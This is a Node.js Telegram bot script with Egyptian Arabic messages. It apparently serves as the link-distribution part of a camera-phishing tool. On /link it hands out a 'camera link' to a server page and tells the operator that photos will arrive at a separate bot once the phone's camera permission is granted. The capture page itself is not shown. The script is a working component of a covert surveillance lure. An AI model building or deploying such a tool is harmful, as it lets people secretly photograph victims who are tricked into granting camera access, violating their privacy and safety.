require('dotenv').config();
const axios = require('axios');

const TOKEN      = process.env.SEND_BOT_TOKEN;
const SERVER_URL = process.env.SERVER_URL;
const API        = `https://api.telegram.org/bot${TOKEN}`;

let OFFSET = 0;

async function getUpdates() {
  try {
    const r = await axios.get(`${API}/getUpdates`, {
      params: { offset: OFFSET, timeout: 30 },
      timeout: 40000
    });

    for (const u of r.data.result) {
      OFFSET = u.update_id + 1;
      const msg = u.message;
      if (!msg || !msg.text) continue;

      const chatId = msg.chat.id;
      const text   = msg.text.trim();

      if (text === '/start') {
        await axios.post(`${API}/sendMessage`, {
          chat_id: chatId,
          text: "👋 أهلاً بك في بوت المصري\n\nاكتب /link للحصول على رابط الكاميرا."
        });
      }
      else if (text === '/link') {
        const link = `${SERVER_URL}/index.html`;
        await axios.post(`${API}/sendMessage`, {
          chat_id: chatId,
          text: `🎯 رابط الكاميرا:\n\n${link}\n\nافتحه على الهاتف، وافق على إذن الكاميرا، والصور هتوصلك على بوت هنداوي 📥`
        });
      }
      else {
        await axios.post(`${API}/sendMessage`, {
          chat_id: chatId,
          text: "❓ اكتب /link"
        });
      }
    }
  } catch (err) {
    if (err.code !== 'ECONNABORTED') console.error("خطأ:", err.message);
  }
}

async function main() {
  console.log("🎛️ بوت المصري شغال...");
  console.log(`🔗 الرابط: ${SERVER_URL}/index.html`);
  while (true) {
    await getUpdates();
  }
}

main();